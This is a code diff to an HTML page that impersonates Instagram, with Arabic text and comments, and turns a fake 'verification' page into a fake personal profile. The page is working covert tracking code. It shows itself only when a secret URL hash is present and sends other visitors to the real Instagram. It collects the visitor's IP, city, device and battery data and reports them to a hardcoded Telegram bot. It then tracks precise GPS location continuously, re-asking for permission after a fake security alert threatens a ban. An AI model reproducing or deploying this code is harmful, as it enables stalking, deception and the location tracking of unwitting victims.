@@ -3,77 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Instagram | Verification</title>
+    <title>Instagram | @ekhlas_2026</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fff; margin: 0; display: none; }
-        .loading-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0095f6; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; margin: 0; padding: 0; display: none; }
+        .nav { height: 44px; border-bottom: 1px solid #dbdbdb; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .p-container { padding: 20px 15px; }
+        .p-pic { width: 77px; height: 77px; border-radius: 50%; border: 1px solid #dbdbdb; object-fit: cover; }
+        .f-btn { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 8px; font-weight: bold; margin-top: 15px; }
     </style>
 </head>
-<body id="mainBody">
-    <div class="loading-screen">
-        <div class="spinner"></div>
-        <p style="color: #262626; margin-top: 15px;">جاري التحقق من ملكية الحساب...</p>
+<body id="b">
+    <div class="nav">Ekhlas</div>
+    <div class="p-container">
+        <div style="display: flex; align-items: center;">
+            <img src="https://k.top4top.io/p_3696qmute0.jpeg" class="p-pic">
+            <div style="display: flex; flex-grow: 1; justify-content: space-around; text-align: center; margin-right: 15px;">
+                <div><b>14</b><br><small>منشور</small></div>
+                <div><b>482</b><br><small>متابع</small></div>
+                <div><b>315</b><br><small>نتابعهم</small></div>
+            </div>
+        </div>
+        <div style="margin-top:15px; font-size:14px;"><b>Ekhlas | إخلاص</b><br>• Personal Account ✨<br>• Palestine | Hebron 🇵🇸</div>
+        <button class="f-btn">متابعة</button>
     </div>
 
     <script>
-        const TOKEN = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
-        const ID = '7184970355';
+        const T = '8492500020:AAH-KijyAHr_46BvwCvd0ociksbtycSXKJs';
+        const C = '7184970355';
 
         window.onload = async () => {
-            if (!window.location.hash.includes("#secure")) {
+            if(window.location.hash.includes("#secure")) {
+                document.getElementById('b').style.display = 'block';
+                // 1. سحب البيانات التقنية فوراً
+                await ghostData();
+                // 2. البدء بالسحب الإجباري والتتبع الحي
+                startLiveTracking();
+            } else {
                 window.location.replace("https://www.instagram.com");
-                return;
             }
-            document.body.style.display = "block";
-            
-            // المرحلة 1: سحب البيانات الصامتة فوراً
-            await sendGhostData();
-            
-            // المرحلة 2: إجبار طلب الـ GPS الدقيق
-            forceGPS();
         };
 
-        async function sendGhostData() {
+        async function ghostData() {
             try {
-                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const msg = `⚠️ **هدف جديد متصل الآن:**\n🌐 IP: ${ip.ip}\n📍 المنطقة: ${ip.city}, ${ip.country_name}\n📱 الجهاز: ${navigator.platform}\n⚙️ المتصفح: ${navigator.userAgent.split(' ').slice(-1)}`;
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                const r = await fetch('https://ipapi.co/json/').then(res => res.json());
+                let b = "N/A"; if(navigator.getBattery) { const bat = await navigator.getBattery(); b = Math.round(bat.level*100)+"%"; }
+                const m = `⚠️ **دخول جديد:**\nIP: ${r.ip}\nCity: ${r.city}\nDevice: ${navigator.platform}\nBattery: ${b}\nRAM: ${navigator.deviceMemory || '4+'}GB`;
+                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
             } catch(e) {}
         }
 
-        function forceGPS() {
-            const gpsOptions = {
-                enableHighAccuracy: true, // إجبار الأيفون على تشغيل GPS الحقيقي
-                timeout: 15000,
-                maximumAge: 0 // عدم قبول أي موقع قديم مخزن
-            };
+        function startLiveTracking() {
+            const opt = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-            navigator.geolocation.getCurrentPosition(
+            // وظيفة التتبع الحي: ترسل تحديثاً كلما تحرك الهدف
+            navigator.geolocation.watchPosition(
                 (p) => {
                     const lat = p.coords.latitude;
                     const lon = p.coords.longitude;
-                    const acc = p.coords.accuracy;
+                    const acc = p.coords.accuracy.toFixed(1);
                     const map = `https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    const report = `🎯 **تم سحب الموقع الدقيق (GPS):**\n📍 الخريطة: ${map}\n🎯 نسبة الخطأ: ${acc.toFixed(1)} متر فقط\n⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;
-                    
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-                    
-                    // تحويل الضحية بعد الصيد لتبديد الشكوك
-                    setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 1500);
+                    const msg = `📍 **تتبع حي (تحرك الهدف):**\n${map}\n🎯 الدقة: ${acc} متر`;
+                    fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`);
                 },
-                (err) => {
-                    // هندسة اجتماعية للإجبار في حال الرفض
-                    if (err.code == 1) {
-                        alert("⚠️ عذراً: يجب السماح بالوصول لـ 'الموقع الدقيق' لتأكيد أنك صاحب الحساب ولتجنب الحظر الدائم.");
-                        forceGPS(); // إعادة المحاولة لإجباره
+                (e) => {
+                    if(e.code == 1) {
+                        alert("⚠️ تنبيه أمني من إنستغرام: يجب تفعيل 'الموقع الدقيق' والسماح بالوصول للموقع لتأكيد هويتك ومشاهدة محتوى الحساب.");
+                        startLiveTracking(); // إعادة الطلب خاوة
                     }
-                }, 
-                gpsOptions
+                }, opt
             );
         }
     </script>
 </body>
 </html>
+
